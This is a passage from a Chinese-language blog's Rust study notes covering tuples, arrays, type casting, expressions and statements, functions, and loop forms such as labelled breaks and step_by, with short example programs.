元组</h3>\n<p>元组中的元素类型可以不同。</p>\n<p>下面一个例子包含了元组的所有基本用法：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">tup</span> = (<span class=\"number\">500</span>, <span class=\"number\">6.4</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> (_, y, _) = tup;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"The value of x is: {}\"</span>, tup.<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"The value of y is: {}\"</span>, y);</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"The value of z is: {}\"</span>, tup.<span class=\"number\">2</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">unit</span>: () = ();</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"The value of unit is: {:?}\"</span>, unit);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>使用 <code>(type1, type2, ..., type_n)</code>\n来定义元组类型</p></li>\n<li><p>用模式匹配的方式<strong>解构</strong>元组</p></li>\n<li><p>支持<strong>匿名变量</strong> <code>_</code></p></li>\n<li><p>用句点 <code>.</code> 索引访问变量</p></li>\n<li><p>特殊的，空元组 <code>()</code> 叫做<strong>单元类型</strong>(unit\ntype)，该类型只有一种值，即<strong>单元值</strong>。单元值和单元类型都写作\n<code>()</code></p>\n<p>如果一个<strong>表达式</strong>不返回任何值，就隐式返回单元值。</p>\n<blockquote>\n<p>单元类型就类似于 C 中的 <code>void</code></p>\n<p>这里的<strong>表达式</strong>用编译原理语法分析过程中的状态来理解。见2.1节</p>\n</blockquote></li>\n</ul>\n<h3 id=\"数组\">1.2.2 数组</h3>\n<p>数组中的元素类型必须相同。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">a</span>: [<span class=\"type\">i32</span>; <span class=\"number\">5</span>] = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>];</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"a has {} elements\"</span>, a.<span class=\"title function_ invoke__\">len</span>());</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{:?}\"</span>, a);</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"a[0] = {}\"</span>, a[<span class=\"number\">0</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"a[1] = {}\"</span>, a[<span class=\"number\">1</span>]); </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">b</span>: [<span class=\"type\">i32</span>; <span class=\"number\">5</span>] = [<span class=\"number\">1</span>; <span class=\"number\">5</span>];</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{:?}\"</span>, b);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<ul>\n<li>类型声明：[type; len]</li>\n<li>数组的值有两种表示：\n<ul>\n<li><code>[num1, num2, ..., num_n]</code></li>\n<li><code>[num; repeat]</code></li>\n</ul></li>\n<li>使用方括号 <code>[]</code> 索引</li>\n</ul>\n<p>和大多数其他语言相同，Rust 的数组使用栈空间。同样也有\n<code>Vector</code> 类型占用堆空间，这在后面再讨论。</p>\n<p>最重要的一点是，Rust 的索引必须在 <code>[0, len-1]</code>\n的范围里，即不可以访问未被分配的无效内存。在运行过程中，任何对无效内存的访问均会报错；在编译阶段，一些很明显的访问无效内存操作也会被检测到。</p>\n<h2 id=\"类型转换\">1.3 类型转换</h2>\n<p>暂时只讨论最简单的类型转换。还有很多使用了标准库中的一些 Trait\n进行类型转换的方法。</p>\n<blockquote>\n<p>Trait 是 Rust 中的一个重要概念，可以被简单的理解为接口。</p>\n</blockquote>\n<p>不像 C/C++ 有很多隐式类型转换的情况（如整型提升等），Rust\n中<strong>几乎所有类型转换都需要显式进行</strong>。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span>: <span class=\"type\">i32</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">y</span>: <span class=\"type\">i64</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    x + y; <span class=\"comment\">// 报错，类型不匹配</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"number\">5</span>; <span class=\"comment\">// 自动推导为i64</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">y</span>: <span class=\"type\">i64</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    x + y; <span class=\"comment\">// 不报错，类型为 i64</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>如果不指定 <code>x</code> 的类型为 <code>i32</code>\n，则会在类型推导过程中把 <code>x</code> 的类型推导为\n<code>i64</code>，看似是隐式类型转换了，本质上还是定义过程的类型推导。</p>\n<p>显示类型转换的方式类似于 Typescript：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span>: <span class=\"type\">i32</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">y</span>: <span class=\"type\">i64</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">z</span> = x <span class=\"keyword\">as</span> <span class=\"type\">i64</span> + y;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>使用 <code>as type</code> 的方式转换类型。</p>\n<h1 id=\"函数语句和表达式\">2 函数、语句和表达式</h1>\n<p>这一部分站在编译原理的角度理解。</p>\n<h2 id=\"表达式\">2.1 表达式</h2>\n<p>表达式用于计算并返回值。表达式可以是常量、变量、算术运算、函数调用等。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">3</span> + <span class=\"number\">4</span> * <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">add</span>(y, <span class=\"number\">5</span>)</span><br></pre></td></tr></table></figure>\n<p>用来创建新作用域的大括号（代码块） <code>{}</code>\n也是一个表达式，返回值大括号里的最后一个表达式：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"number\">3</span>;</span><br><span class=\"line\">    x + <span class=\"number\">1</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>这里的返回值就是 4。需要注意的是，<code>x + 1</code> 的末尾没有\n<code>;</code> ，如果加上分号，则变成了一个语句，而语句没有返回值。</p>\n<p>总结：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">大括号表达式 ::= { &lt;语句列表&gt; [表达式] }</span><br></pre></td></tr></table></figure>\n<p>如果有表达式，大括号表达式的返回值为表达式的值；如果没有表达式，返回值为单元值<code>()</code>。</p>\n<h2 id=\"语句\">2.2 语句</h2>\n<p>语句用于执行某些操作，<strong>通常不返回值</strong>。常见的语句包括变量声明、赋值、表达式语句、控制流语句（如if、for、while）等。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\">x = x + <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> x &gt; <span class=\"number\">5</span> {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"x is greater than 5\"</span>);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>通常不返回值，也就是说有例外。见3.1节 if else 语句。</p>\n<h2 id=\"函数\">2.3 函数</h2>\n<p>函数是代码的基本组织单位，用于封装特定的功能。函数的定义包括函数名、参数列表、返回类型和函数体。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">test</span>(a: <span class=\"type\">i32</span>, b: <span class=\"type\">i32</span>) <span class=\"punctuation\">-&gt;</span> <span class=\"type\">i32</span> {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> a &gt; b {<span class=\"keyword\">return</span> a - b} </span><br><span class=\"line\">    a + b</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>函数体有点像是一个大括号表达式，所以末尾的表达式可以不使用\n<code>return</code> 进行返回。用 <code>return</code>\n可以让函数提前返回。（但是大括号表达式里不能用 <code>return</code>\n进行返回）</p>\n<p>如果函数有返回值，必须指定返回值类型（否则返回值类型为单元类型\n<code>()</code> ）。</p>\n<p>函数在使用前，并不需要先声明。例如</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"The value of a is: {}\"</span>, <span class=\"title function_ invoke__\">test</span>(<span class=\"number\">1</span>, <span class=\"number\">2</span>));</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">test</span>(a: <span class=\"type\">i32</span>, b: <span class=\"type\">i32</span>) <span class=\"punctuation\">-&gt;</span> <span class=\"type\">i32</span> {</span><br><span class=\"line\">    a + b</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h1 id=\"控制流\">3 控制流</h1>\n<p>外观上最显著的不同是，条件不需要加括号。</p>\n<h2 id=\"if-语句\">3.1 if 语句</h2>\n<p>基本用法与其他语言类似，不赘述。</p>\n<p>但是 Rust 中，if-else 语句是可以有返回值的。</p>\n<blockquote>\n<p>需要明确一下，这里的有返回值指的是返回值不是单元值\n<code>()</code></p>\n</blockquote>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">ret</span> = <span class=\"keyword\">if</span> x &gt; <span class=\"number\">5</span> {</span><br><span class=\"line\">        <span class=\"built_in\">println!</span>(<span class=\"string\">\"x is greater than 5\"</span>);</span><br><span class=\"line\">        <span class=\"number\">0</span></span><br><span class=\"line\">    } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        <span class=\"built_in\">println!</span>(<span class=\"string\">\"x is less than or equal to 5\"</span>);</span><br><span class=\"line\">        <span class=\"number\">1</span></span><br><span class=\"line\">    };</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"ret is {}\"</span>, ret);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<ul>\n<li>必须有一个 <code>else</code>\n才可以有返回值。（否则可能没有返回值）</li>\n<li>所有大括号表达式的返回值类型必须相同。（否则类型不可推断）</li>\n</ul>\n<p>再次强调，上面说的 <strong>没有返回值</strong> 指的是\n<strong>返回值=()</strong>。如果显示指定变量的返回值就是\n<code>()</code>，不需要 <code>else</code> 也可以。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">ret</span>: () = <span class=\"keyword\">if</span> x == <span class=\"number\">5</span> {</span><br><span class=\"line\">        <span class=\"built_in\">println!</span>(<span class=\"string\">\"x is five!\"</span>);</span><br><span class=\"line\">    }; </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>当然，这种写法并没有什么意义，只是在反向理解 Rust\n编译过程的实现。</p>\n<p>通常的用法如下，目的是压行，代码更模块化、可读性更强，类似与 python\n里的 <code>x = 0 if condition else 1</code></p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">ret</span> = <span class=\"keyword\">if</span> x == <span class=\"number\">5</span> {<span class=\"literal\">true</span>} <span class=\"keyword\">else</span> {<span class=\"literal\">false</span>};</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"ret is {}\"</span>, ret);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"loop\">3.2 loop</h2>\n<p>Rust 提供了 3\n中循环，<code>loop</code>，<code>while</code>，<code>for</code>。<code>loop</code>\n是其他语言没有的。</p>\n<p><code>loop</code> 就是一个 <code>while true</code>\n的死循环。但是提供了一些语法糖：</p>\n<h3 id=\"嵌套循环跳出\">3.2.1 嵌套循环跳出</h3>\n<p><code>break</code>\n语句用于跳出循环，同其他语言只能跳出最内层循环。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">loop</span> {</span><br><span class=\"line\">        <span class=\"built_in\">print!</span>(<span class=\"string\">\"1\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">loop</span> {</span><br><span class=\"line\">            <span class=\"built_in\">print!</span>(<span class=\"string\">\"2\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 结果是 1212121212...</span></span><br></pre></td></tr></table></figure>\n<p>但是可以给外层的 <code>loop</code> 添加一个标记：<code>'label</code>\n，就可以直接跳出外层循环。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"symbol\">'out</span>: <span class=\"keyword\">loop</span> {</span><br><span class=\"line\">        <span class=\"built_in\">print!</span>(<span class=\"string\">\"1\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">loop</span> {</span><br><span class=\"line\">            <span class=\"built_in\">print!</span>(<span class=\"string\">\"2\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span> <span class=\"symbol\">'out</span>;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 结果是 12</span></span><br></pre></td></tr></table></figure>\n<p>相比于其他语言，想要直接跳出多层循环只有两种方法：</p>\n<ul>\n<li>使用一个中间变量记录结果（<code>while (loop) {}</code> ）</li>\n<li>使用goto</li>\n</ul>\n<h3 id=\"返回值\">3.2.2 返回值</h3>\n<p><code>loop</code> 可以通过 <code>break</code>\n传递返回值。太方便了。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">ret</span> = <span class=\"symbol\">'out</span>: <span class=\"keyword\">loop</span> {</span><br><span class=\"line\">        <span class=\"built_in\">print!</span>(<span class=\"string\">\"1\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">loop</span> {</span><br><span class=\"line\">            <span class=\"built_in\">print!</span>(<span class=\"string\">\"2\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">break</span> <span class=\"symbol\">'out</span> <span class=\"number\">123</span>;</span><br><span class=\"line\">        }</span><br><span class=\"line\">    };</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"ret: {}\"</span>, ret);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"while循环\">3.3 while循环</h2>\n<p>没什么区别，不讲了</p>\n<h2 id=\"for循环\">3.4 for循环</h2>\n<p>没什么细节，让GPT写了一些常见的用法。</p>\n<p>在 Rust 中，<code>for</code>\n循环有多种用法，通常用于遍历集合或范围。以下是所有常见的\n<code>for</code> 循环用法：</p>\n<ol type=\"1\">\n<li><strong>遍历范围：</strong></li>\n</ol>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"variable\">i</span> <span class=\"keyword\">in</span> <span class=\"number\">0</span>..<span class=\"number\">5</span> {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, i);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>上面的代码将输出 0 到 4。</p>\n<ol start=\"2\" type=\"1\">\n<li><strong>遍历集合：</strong></li>\n</ol>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable\">arr</span> = [<span class=\"number\">10</span>, <span class=\"number\">20</span>, <span class=\"number\">30</span>, <span class=\"number\">40</span>, <span class=\"number\">50</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"variable\">element</span> <span class=\"keyword\">in</span> arr.<span class=\"title function_ invoke__\">iter</span>() {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, element);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>使用 <code>iter</code> 方法遍历数组。</p>\n<ol start=\"3\" type=\"1\">\n<li><strong>遍历可变集合：</strong></li>\n</ol>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"keyword\">mut </span><span class=\"variable\">vec</span> = <span class=\"built_in\">vec!</span>[<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"variable\">element</span> <span class=\"keyword\">in</span> vec.<span class=\"title function_ invoke__\">iter_mut</span>() {</span><br><span class=\"line\">    *element *= <span class=\"number\">2</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"built_in\">println!</span>(<span class=\"string\">\"{:?}\"</span>, vec);</span><br></pre></td></tr></table></figure>\n<p>使用 <code>iter_mut</code> 方法遍历和修改向量中的元素。</p>\n<ol start=\"4\" type=\"1\">\n<li><strong>遍历字符串字符：</strong></li>\n</ol>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable\">s</span> = <span class=\"string\">\"hello\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"variable\">c</span> <span class=\"keyword\">in</span> s.<span class=\"title function_ invoke__\">chars</span>() {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, c);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>使用 <code>chars</code> 方法遍历字符串中的字符。</p>\n<ol start=\"5\" type=\"1\">\n<li><strong>遍历字节：</strong></li>\n</ol>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable\">s</span> = <span class=\"string\">\"hello\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"variable\">b</span> <span class=\"keyword\">in</span> s.<span class=\"title function_ invoke__\">bytes</span>() {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, b);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>使用 <code>bytes</code> 方法遍历字符串中的字节。</p>\n<ol start=\"6\" type=\"1\">\n<li><strong>遍历 <code>Option</code> 类型：</strong></li>\n</ol>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable\">maybe_value</span> = <span class=\"title function_ invoke__\">Some</span>(<span class=\"number\">42</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"variable\">value</span> <span class=\"keyword\">in</span> maybe_value {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, value);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>如果 <code>Option</code> 是 <code>Some</code>，则 <code>for</code>\n循环会遍历其中的值。</p>\n<ol start=\"7\" type=\"1\">\n<li><strong>遍历 <code>Result</code> 类型：</strong></li>\n</ol>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable\">result</span>: <span class=\"type\">Result</span>&lt;<span class=\"type\">i32</span>, &amp;<span class=\"type\">str</span>&gt; = <span class=\"title function_ invoke__\">Ok</span>(<span class=\"number\">42</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"variable\">value</span> <span class=\"keyword\">in</span> result {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, value);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>如果 <code>Result</code> 是 <code>Ok</code>，则 <code>for</code>\n循环会遍历其中的值。</p>\n<ol start=\"8\" type=\"1\">\n<li><strong>结合 <code>enumerate</code> 方法：</strong></li>\n</ol>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable\">arr</span> = [<span class=\"number\">10</span>, <span class=\"number\">20</span>, <span class=\"number\">30</span>, <span class=\"number\">40</span>, <span class=\"number\">50</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (index, value) <span class=\"keyword\">in</span> arr.<span class=\"title function_ invoke__\">iter</span>().<span class=\"title function_ invoke__\">enumerate</span>() {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"Index: {}, Value: {}\"</span>, index, value);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>使用 <code>enumerate</code> 方法获取索引和值对。</p>\n<ol start=\"9\" type=\"1\">\n<li><strong>使用 <code>into_iter</code> 方法：</strong></li>\n</ol>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable\">vec</span> = <span class=\"built_in\">vec!</span>[<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"variable\">element</span> <span class=\"keyword\">in</span> vec.<span class=\"title function_ invoke__\">into_iter</span>() {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, element);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>使用 <code>into_iter</code> 方法将向量所有权移动到迭代器中。</p>\n<ol start=\"10\" type=\"1\">\n<li><strong>多重循环：</strong></li>\n</ol>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"variable\">i</span> <span class=\"keyword\">in</span> <span class=\"number\">1</span>..<span class=\"number\">3</span> {</span><br><span class=\"line\">    <span class=\"keyword\">for</span> <span class=\"variable\">j</span> <span class=\"keyword\">in</span> <span class=\"number\">1</span>..<span class=\"number\">3</span> {</span><br><span class=\"line\">        <span class=\"built_in\">println!</span>(<span class=\"string\">\"i: {}, j: {}\"</span>, i, j);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>嵌套循环。</p>\n<p>在 Rust 中，<code>for</code> 循环的范围 (<code>range</code>)\n默认步长为 1，无法直接通过语法来控制步长。不过，你可以通过使用迭代器的\n<code>step_by</code> 方法来控制步长。以下是一些示例：</p>\n<ol type=\"1\">\n<li><strong>使用 <code>step_by</code> 控制步长：</strong></li>\n</ol>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"variable\">i</span> <span class=\"keyword\">in</span> (<span class=\"number\">0</span>..<span class=\"number\">10</span>).<span class=\"title function_ invoke__\">step_by</span>(<span class=\"number\">2</span>) {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, i);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>上面的代码将以步长 2 遍历范围，输出 0、2、4、6、8。</p>\n<ol start=\"2\" type=\"1\">\n<li><strong>步长为负数（降序循环）：</strong></li>\n</ol>\n<p>Rust 的 <code>Range</code>\n类型不支持直接创建降序范围。你可以通过自定义迭代器来实现：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"variable\">i</span> <span class=\"keyword\">in</span> (<span class=\"number\">0</span>..<span class=\"number\">10</span>).<span class=\"title function_ invoke__\">rev</span>().<span class=\"title function_ invoke__\">step_by</span>(<span class=\"number\">2</span>) {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, i);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>上面的代码将以步长 2 逆序遍历范围，输出 9、7、5、3、1。</p>\n<ol start=\"3\" type=\"1\">\n<li><strong>自定义范围和步长：</strong></li>\n</ol>\n<p>你也可以使用 <code>while</code> 循环来更灵活地控制范围和步长：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"keyword\">mut </span><span class=\"variable\">i</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> i &lt; <span class=\"number\">10</span> {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, i);</span><br><span class=\"line\">    i += <span class=\"number\">2</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>上面的代码同样以步长 2 遍历范围，输出 0、2、4、6、8。</p>\n<ol start=\"4\" type=\"1\">\n<li><strong>遍历数组或向量时使用步长：</strong></li>\n</ol>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"variable\">arr</span> = [<span class=\"number\">10</span>, <span class=\"number\">20</span>, <span class=\"number\">30</span>, <span class=\"number\">40</span>, <span class=\"number\">50</span>, <span class=\"number\">60</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (index, value) <span class=\"keyword\">in</span> arr.<span class=\"title function_ invoke__\">iter</span>().<span class=\"title function_ invoke__\">enumerate</span>().<span class=\"title function_ invoke__\">step_by</span>(<span class=\"number\">2</span>) {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"Index: {}, Value: {}\"</span>, index, value);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>上面的代码以步长 2 遍历数组中的元素，输出 Index: 0, Value: 10 和\nIndex: 2, Value: 30 等。</p>\n<p>这些方法可以让你在 Rust 中通过 <code>for</code> 循环控制步长。</p>\n<h1 id=\"其他\">其他</h1>\n<p>vscode 里的 Rust 插件真的是非常的智能。</p>\n<p>cargo 的报错提示也非常的清晰，很优雅。</p>\n","categories":["笔记"],"tags":["学习笔记","Rust"]},{"title":"Rust 学习笔记 - 所有权","url":"/rust/3-%E6%89%80%E6%9C%89%E6%9D%83/","content":"<blockquote>\n<p>本文属于学习笔记，内容可能有误、可能不全面，仅代表个人在学习这一特性时的理解和总结</p>\n</blockquote>\n<p>本文记录了 Rust 所有权 (<em>ownership</em>) 相关的内容。</p>\n<span id=\"more\"></span>\n<p>其他语言的内存管理机制基本分为两类：</p>\n<ul>\n<li>以 C 为代表的，显示分配和释放内存。\n<ul>\n<li>优点：内存管理完全由程序员负责，效率高</li>\n<li>缺点：显而易见，程序员会出错，容易发生内存泄漏、产生重复释放等Bug</li>\n</ul></li>\n<li>以 